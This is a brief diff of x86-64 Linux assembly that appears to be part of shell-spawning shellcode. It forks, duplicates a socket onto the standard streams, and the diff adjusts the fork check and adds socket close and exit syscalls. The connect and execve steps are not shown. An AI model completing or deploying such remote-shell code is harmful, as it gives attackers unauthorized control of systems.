@@ -51,8 +51,8 @@ _start:
     mov rax, 0x39                   ; fork()
     syscall
 
-    cmp rax, 0
-    jne _end
+    cmp rax, -1
+    je _end
 
     mov rax, 0x21                   ; dup2(oldfd, newfd)
     mov rdi, rbx                    ; sock
@@ -76,5 +76,10 @@ _start:
     syscall
 
 _end:
+    mov rax, 0x03                   ; close(sock)
+    mov rdi, rbx                    ; sock
+    syscall
+
     mov rax, 0x3C                   ; exit(0)
     mov rdi, 0x00                   ; 0
+    syscall
